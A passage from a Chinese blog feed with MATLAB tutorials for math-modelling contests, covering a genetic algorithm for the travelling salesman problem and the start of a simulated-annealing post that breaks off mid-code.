class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[minObj,x]</span>=<span class="title">GATSP</span><span class="params">(N,attach,NIND)</span></span></span><br><span class="line"></span><br><span class="line">    MAXGEN=<span class="number">200</span>;</span><br><span class="line">    <span class="keyword">if</span> nargin&lt;<span class="number">3</span></span><br><span class="line">        NIND=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    Pc=<span class="number">0.9</span>;</span><br><span class="line">    Pm=<span class="number">0.2</span>;</span><br><span class="line">    GGAP=<span class="number">0.9</span>;</span><br><span class="line"></span><br><span class="line">    Chrom=InitPop(NIND,N);</span><br><span class="line">    <span class="comment">% Rlength=PathLength(D,Chrom(1,:));</span></span><br><span class="line">    gen=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">% ObjV=PathLength(D,Chrom);</span></span><br><span class="line">    <span class="comment">% preObjV=min(ObjV);</span></span><br><span class="line">    history=[];</span><br><span class="line">    h=waitbar(<span class="number">0</span>,<span class="string">'Evolving....'</span>);</span><br><span class="line">    <span class="keyword">while</span> gen&lt;MAXGEN</span><br><span class="line">        ObjV=PathLength(attach,Chrom);</span><br><span class="line">    <span class="comment">%    min(ObjV)</span></span><br><span class="line">        FitnV=Fitness(ObjV);</span><br><span class="line">        SelCh=Select(Chrom,FitnV,GGAP);</span><br><span class="line">        SelCh=Recombin(SelCh,Pc);</span><br><span class="line">        SelCh=Mutate(SelCh,Pm);</span><br><span class="line">        SelCh=Reverse(SelCh,attach);</span><br><span class="line">        Chrom=Reins(Chrom,SelCh,ObjV);</span><br><span class="line">        history=[history <span class="built_in">min</span>(ObjV)];</span><br><span class="line">        gen=gen+<span class="number">1</span>;</span><br><span class="line">        waitbar(gen/MAXGEN,h,sprintf(<span class="string">'Now Generation:%d'</span>,gen));</span><br><span class="line">        <span class="keyword">if</span> gen&gt;<span class="number">30</span></span><br><span class="line">            <span class="keyword">if</span> sum(diff(history(<span class="keyword">end</span><span class="number">-30</span>:<span class="keyword">end</span>)))==<span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    close(h)</span><br><span class="line"></span><br><span class="line">    ObjV=PathLength(attach,Chrom);</span><br><span class="line">    <span class="built_in">plot</span>(history)</span><br><span class="line">    title(<span class="string">'Fitness curve'</span>,<span class="string">'fontsize'</span>,<span class="number">12</span>);</span><br><span class="line">    xlabel(<span class="string">'Evolutionary generation'</span>,<span class="string">'fontsize'</span>,<span class="number">12</span>);ylabel(<span class="string">'Option'</span>,<span class="string">'fontsize'</span>,<span class="number">12</span>);</span><br><span class="line">    <span class="comment">% axis([0,MAXGEN,0,1])</span></span><br><span class="line"></span><br><span class="line">    [minObj,minInd]=<span class="built_in">min</span>(ObjV);</span><br><span class="line">    x=Chrom(minInd,:);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="初始化种群"><a href="#初始化种群" class="headerlink" title="初始化种群"></a>初始化种群</h2><p>初始化种群实际就是产生NIND个符合要求的解.<code>InitPop.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Chrom</span>=<span class="title">InitPop</span><span class="params">(NIND,N)</span></span></span><br><span class="line">    <span class="comment">%NIND 种群大小</span></span><br><span class="line">    <span class="comment">%N 单个染色体长度(城市个数)</span></span><br><span class="line">    Chrom=<span class="built_in">zeros</span>(NIND,N);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:NIND</span><br><span class="line">        Chrom(<span class="built_in">i</span>,:)=randperm(N); <span class="comment">%随机产生种群</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="适应度函数"><a href="#适应度函数" class="headerlink" title="适应度函数"></a>适应度函数</h2><p>TSP的要求是路程最短,而适应度函数视值越大越优,所以我们这里先计算出长度后,再对其取反.</p><p><code>PathLength.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">len</span>=<span class="title">PathLength</span><span class="params">(graph,Chrom)</span></span></span><br><span class="line">    [row,col]=<span class="built_in">size</span>(graph);</span><br><span class="line">    NIND=<span class="built_in">size</span>(Chrom,<span class="number">1</span>);</span><br><span class="line">    len=<span class="built_in">zeros</span>(NIND,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:NIND</span><br><span class="line">        <span class="comment">% path</span></span><br><span class="line">        p=[Chrom(<span class="built_in">i</span>,:) Chrom(<span class="built_in">i</span>,<span class="number">1</span>)];</span><br><span class="line">        i1=p(<span class="number">1</span>:<span class="keyword">end</span><span class="number">-1</span>);</span><br><span class="line">        i2=p(<span class="number">2</span>:<span class="keyword">end</span>);</span><br><span class="line">        len(<span class="built_in">i</span>,<span class="number">1</span>)=sum(graph((i1<span class="number">-1</span>)*col+i2));<span class="comment">% ∑graph(from,to)</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><code>Fitness.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FitnV</span>=<span class="title">Fitness</span><span class="params">(len)</span></span></span><br><span class="line">    <span class="comment">% len 个体长度</span></span><br><span class="line">    FitnV=<span class="number">1.</span>/len;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="选择操作"><a href="#选择操作" class="headerlink" title="选择操作"></a>选择操作</h2><p>模拟自然选择,实际上就是指适应度越好的解被留下来的几率越大(但也不是说适应度不好的解不被留下).<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Select</span><span class="params">(Chrom,FitnV,GGAP)</span></span></span><br><span class="line">    <span class="comment">%种群 适应值 选择概率 被选择个体</span></span><br><span class="line">    NIND=<span class="built_in">size</span>(Chrom,<span class="number">1</span>);</span><br><span class="line">    NSel=<span class="built_in">max</span>(<span class="built_in">floor</span>(NIND*GGAP+<span class="number">0.5</span>),<span class="number">2</span>);</span><br><span class="line">    Chrlx=Sus(FitnV,NSel);</span><br><span class="line">    SelCh=Chrom(Chrlx,:);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NewChrlx</span>=<span class="title">Sus</span><span class="params">(FitnV,NSel)</span></span></span><br><span class="line">    <span class="comment">%适应值 数目</span></span><br><span class="line">    <span class="comment">%备选索引</span></span><br><span class="line">    [Nind,ans_]=<span class="built_in">size</span>(FitnV);</span><br><span class="line">    cumfit=cumsum(FitnV);</span><br><span class="line">    trials=cumfit(Nind)/NSel*(<span class="built_in">rand</span>+(<span class="number">0</span>:NSel<span class="number">-1</span>)');</span><br><span class="line">    Mf=cumfit(:,<span class="built_in">ones</span>(<span class="number">1</span>,NSel));</span><br><span class="line">    Mt=trials(:,<span class="built_in">ones</span>(<span class="number">1</span>,Nind))';</span><br><span class="line">    [NewChrlx,ans_]=<span class="built_in">find</span>(Mt&lt;Mf&amp;[<span class="built_in">zeros</span>(<span class="number">1</span>,NSel);Mf(<span class="number">1</span>:Nind<span class="number">-1</span>,:)]&lt;=Mt);</span><br><span class="line">    [ans_,shuf]=<span class="built_in">sort</span>(<span class="built_in">rand</span>(NSel,<span class="number">1</span>));</span><br><span class="line">    NewChrlx=NewChrlx(shuf);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="交叉操作"><a href="#交叉操作" class="headerlink" title="交叉操作"></a>交叉操作</h2><p>模拟染色体的交叉现象,注意在这里会出现城市出现重复的现象,需要用部分映射的方法消除冲突(介于篇幅不赘述,但我就记得这问题我想了一下午,然后一个数科院的妹子3分钟搞定了.顿时就感觉!!).<br>原先的两个解:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>| <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>|</span><br><span class="line">|--------|-----------|---------|</span><br><span class="line">|<span class="number">10</span>, <span class="number">5</span>, <span class="number">4</span>| <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>|  <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>|</span><br></pre></td></tr></table></figure></p><p>交叉<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>| <span class="number">10</span>, *, *|</span><br><span class="line">|--------|-----------|---------|</span><br><span class="line">|<span class="number">10</span>, <span class="number">5</span>, *| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>|  *, <span class="number">1</span>, <span class="number">9</span>|</span><br></pre></td></tr></table></figure></p><p>部分映射<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>| <span class="number">10</span>, <span class="number">4</span>, <span class="number">2</span>|</span><br><span class="line">|--------|-----------|---------|</span><br><span class="line">|<span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>|  <span class="number">6</span>, <span class="number">1</span>, <span class="number">9</span>|</span><br></pre></td></tr></table></figure></p><p><code>Recombin.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Recombin</span><span class="params">(SelCh,Pc)</span></span></span><br><span class="line">    <span class="comment">%被选择个体 概率</span></span><br><span class="line">    <span class="comment">%交叉后个体</span></span><br><span class="line">    NSel=<span class="built_in">size</span>(SelCh,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">2</span>:NSel-<span class="built_in">mod</span>(NSel,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> Pc&gt;=<span class="built_in">rand</span></span><br><span class="line">            [SelCh(<span class="built_in">i</span>,:),SelCh(<span class="built_in">i</span>+<span class="number">1</span>,:)]=intercross(SelCh(<span class="built_in">i</span>,:),SelCh(<span class="built_in">i</span>+<span class="number">1</span>,:));</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[a,b]</span>=<span class="title">intercross</span><span class="params">(a,b)</span></span></span><br><span class="line">    L=<span class="built_in">length</span>(a);</span><br><span class="line">    r1=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>,L]);</span><br><span class="line">    r2=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>,L]);</span><br><span class="line">    <span class="keyword">if</span> r1~=r2</span><br><span class="line">        a0=a;b0=b;</span><br><span class="line">        s=<span class="built_in">min</span>([r1,r2]);</span><br><span class="line">        e=<span class="built_in">max</span>([r1,r2]);</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">i</span>=s:e</span><br><span class="line">            a1=a;b1=b;</span><br><span class="line">            a(<span class="built_in">i</span>)=b0(<span class="built_in">i</span>);</span><br><span class="line">            b(<span class="built_in">i</span>)=a0(<span class="built_in">i</span>);</span><br><span class="line">            x=<span class="built_in">find</span>(a==a(<span class="built_in">i</span>));</span><br><span class="line">            y=<span class="built_in">find</span>(b==b(<span class="built_in">i</span>));</span><br><span class="line">            i1=x(x~=<span class="built_in">i</span>);</span><br><span class="line">            i2=y(y~=<span class="built_in">i</span>);</span><br><span class="line">            <span class="keyword">if</span> ~<span class="built_in">isempty</span>(i1)</span><br><span class="line">                a(i1)=a1(<span class="built_in">i</span>);</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">if</span> ~<span class="built_in">isempty</span>(i2)</span><br><span class="line">                b(i2)=b1(<span class="built_in">i</span>);</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="变异操作"><a href="#变异操作" class="headerlink" title="变异操作"></a>变异操作</h2><p>模拟染色体的变异现象,这里的算子就是两个随机位置上的数交换<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>| <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>|</span><br><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>| <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>|</span><br></pre></td></tr></table></figure></p><p><code>Mutate.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Mutate</span><span class="params">(SelCh,Pm)</span></span></span><br><span class="line">    <span class="comment">%个体 概率</span></span><br><span class="line">    [NSel,L]=<span class="built_in">size</span>(SelCh);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:NSel</span><br><span class="line">        <span class="keyword">if</span> Pm&gt;=<span class="built_in">rand</span></span><br><span class="line">            R=randperm(L);</span><br><span class="line">            SelCh(<span class="built_in">i</span>,R(<span class="number">1</span>:<span class="number">2</span>))=SelCh(<span class="built_in">i</span>,R(<span class="number">2</span>:<span class="number">-1</span>:<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h2><p>就是把经过选择,交叉,变异的解与旧解混合,保证种群内个体数不变.<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Chrom</span>=<span class="title">Reins</span><span class="params">(Chrom,SelCh,ObjV)</span></span></span><br><span class="line">    NIND=<span class="built_in">size</span>(Chrom,<span class="number">1</span>);</span><br><span class="line">    NSel=<span class="built_in">size</span>(SelCh,<span class="number">1</span>);</span><br><span class="line">    [TobjV,index]=<span class="built_in">sort</span>(ObjV);</span><br><span class="line">    Chrom=[Chrom(index(<span class="number">1</span>:NIND-NSel),:);SelCh];</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="反转-不必要掌握"><a href="#反转-不必要掌握" class="headerlink" title="反转(不必要掌握)"></a>反转(不必要掌握)</h2><p>反转操作是针对TSP问题对于局部的一种优化,本身不在遗传算法范围内.这里给出算法代码.<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Reverse</span><span class="params">(SelCh,D)</span></span></span><br><span class="line">    [row,col]=<span class="built_in">size</span>(SelCh);</span><br><span class="line">    ObjV=PathLength(D,SelCh);</span><br><span class="line">    SelCh1=SelCh;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:row</span><br><span class="line">        r1=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>:col]);</span><br><span class="line">        r2=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>:col]);</span><br><span class="line">        mininverse=<span class="built_in">min</span>([r1 r2]);</span><br><span class="line">        maxinverse=<span class="built_in">max</span>([r1 r2]);</span><br><span class="line">        SelCh1(<span class="built_in">i</span>,mininverse:maxinverse)=SelCh1(<span class="built_in">i</span>,maxinverse:<span class="number">-1</span>:mininverse);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ObjV1=PathLength(D,SelCh1);</span><br><span class="line">    index=ObjV1&lt;ObjV;</span><br><span class="line">    SelCh(index,:)=SelCh1(index,:);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>遗传算法是一个模拟生物遗传进化的,比较成熟的大型智能算法.采用设计好的算子,可以解决大部分类型的规划问题.但由于其算法较为复杂,在比赛中没有充分把握还是要谨慎使用.<br>本文借助三个案例,大致介绍了遗传算法的工作原理,同时对两大典型的规划问题给出了简单可调用的函数原型.方便大家学习使用.<br>同时,遗传算法的优劣总结如下(个人观点):</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol><li>相对于新型的智能算法,如:粒子群算法,蚁群算法.他更加成熟稳定.这表现在可适用的问题类型众多(蚁群不能算TSP).</li><li>相对于模拟退火算法,它不用给出初始值和重组解的方式,而是交给算法本身完成.使用时只需给定目标函数和解的限制条件.</li><li>相对于模拟退火,它有更优秀的收敛时间,可控的时间复杂度.并在连续型随机变量上有明显优势.</li><li>相对于传统算法,有一定的定制空间,自己定制的目标函数能适用于matlab的各种函数(包括给神经网络做优化).</li></ol><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ol><li>相对于新型智能算法,它收敛速度和结果差强人意.</li><li>相对于能够定制解的模拟退火,遗传算法不够灵活.</li><li>整体算法实现复杂,且由于算子众多,学习成本大.若在比赛中不能将问题转化成文中介绍的两种类型,不建议使用该算法.</li></ol><p>参考书籍:《MATLAB智能算法30个案例分析》<br>程序下载: <a href="https://github.com/Anemone95/matlab-GA" target="_blank" rel="noopener">https://github.com/Anemone95/matlab-GA</a></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模拟退火——史上最简单的智能算法</title>
      <link href="/%E6%95%B0%E6%A8%A1-%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E2%80%94%E2%80%94%E5%8F%B2%E4%B8%8A%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/"/>
      <url>/%E6%95%B0%E6%A8%A1-%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E2%80%94%E2%80%94%E5%8F%B2%E4%B8%8A%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>一篇很久之前写的文章了，不过过了这么多年，模拟退火由于其效果和实现简单的优势，依然是智能算法中一个比较热门的算法，故老博客搬运而来。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>模拟退火算法从外部来看就是一个优化问题的解析器,我们给他传递初始解和产生新解的方法,它就能不断产生新解,并比较最终返回一个近似最优解.由于数学建模对算法的时间限制不严,而模拟退火又较易于实现,因此它也是数学建模里较常用的一种智能算法.<img src="/数模-模拟退火——史上最简单的智能算法/sa.jpg" alt="sa"></p><a id="more"></a><h1 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h1><p>在介绍具体算法前,我们完全可以在短时间内使用上模拟退火.</p><h2 id="例1-求min-x-2-y-2-x-y∈R"><a href="#例1-求min-x-2-y-2-x-y∈R" class="headerlink" title="例1:求min(x^2+y^2),x,y∈R."></a>例1:求<code>min(x^2+y^2),x,y∈R</code>.</h2><ul><li><p>首先,我们提供一个初始解.文件<code>main.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=[<span class="number">2</span>,<span class="number">2</span>];</span><br></pre></td></tr></table></figure></li><li><p>其次,构造出一个评价函数(或称目标函数).文件<code>OptFun.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>=<span class="title">OptFun</span><span class="params">(x)</span></span></span><br><span class="line">y=x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>接着,构造一个能够不断<strong>根据旧解</strong>产生新解的函数.这里我们根据旧解以正态随机函数的形式产生新解.文件<code>Arrise.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">X</span>=<span class="title">Arrise</span><span class="params">(x)</span></span></span><br><span class="line">X(<span class="number">1</span>)=normrnd(x(<span class="number">1</span>),<span class="number">2</span>);</span><br><span class="line">X(<span class="number">2</span>)=normrnd(x(<span class="number">2</span>),<span class="number">2</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>复制<code>EzSA.m</code>到文件夹.</p></li><li><p>最后,调用现成的模拟退火函数EzSA.文件<code>main.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x,res ]=EzSA(x,@myFirstSA,@Arrise)</span><br></pre></td></tr></table></figure><p>  如果你看到一个进度条,那么恭喜你,你已经会使用模拟退火算法了!</p><p>  让我们看看结果:</p><p>  <img src="/数模-模拟退火——史上最简单的智能算法/res1.jpg" alt="res1"></p><p>  图像记载了我们之前尝试的解值,可以看出在数次迭代后数值处于稳定状态,表示这次模拟退火算法成功了.</p><p>  同时,x 返回较优解,res返回较优值.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x =</span><br><span class="line">   <span class="number">-0.0035</span>   <span class="number">-0.0027</span></span><br><span class="line">res =</span><br><span class="line">   <span class="number">1.9562e-05</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>让我们总结一下模拟退火函数的使用步骤:</strong></p><ol><li>提供或初始化一个初始解.</li><li>构造出一个评价函数(或称目标函数),该函数接收解,并返回一个数值(视值越小解越优).</li><li>构造一个能够不断<strong>根据旧解</strong>产生新解的函数(注意,这个函数的设计优劣直接影响到模拟退火效果的好坏).</li><li>调用现成的模拟退火函数EzSA(初始解,评价函数句柄,产生新解函数句柄).</li><li>一段时间后模拟退火算法结束,返回较优解和解值</li></ol><h2 id="例2-旅行商问题-TSP"><a href="#例2-旅行商问题-TSP" class="headerlink" title="例2:旅行商问题(TSP)"></a>例2:旅行商问题(TSP)</h2><p>现有五个城市,彼此间距离如图所示,现在旅行商需要经过所有城市一次并回到出发点.我们需要为他规划最短路线.</p><p><img src="/数模-模拟退火——史上最简单的智能算法/graph.jpg" alt="graph"></p><ul><li><p>首先,以邻接矩阵存储图并提供初始解.文件<code>main.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> n    <span class="comment">%n为城市数,由于在无法将n以参数形式传递给计算距离的函数,故声明为全局变量</span></span><br><span class="line"><span class="keyword">global</span> graph <span class="comment">%同上</span></span><br><span class="line">n=<span class="number">5</span>;</span><br><span class="line">graph=[<span class="number">0</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">3</span>;<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>;<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>;<span class="number">1</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">2</span>;<span class="number">3</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">city=<span class="number">1</span>:<span class="number">5</span>; <span class="comment">%初始解</span></span><br></pre></td></tr></table></figure></li><li><p>其次是评价函数,设city为五个城市的访问顺序.文件<code>computerTour.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">len</span>=<span class="title">computerTour</span><span class="params">(city)</span>   %计算路线总长度，每个城市只计算和下家城市之间的距离。</span></span><br><span class="line">    <span class="keyword">global</span> n <span class="comment">%获取n为城市数</span></span><br><span class="line">    <span class="keyword">global</span> graph</span><br><span class="line">    len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span 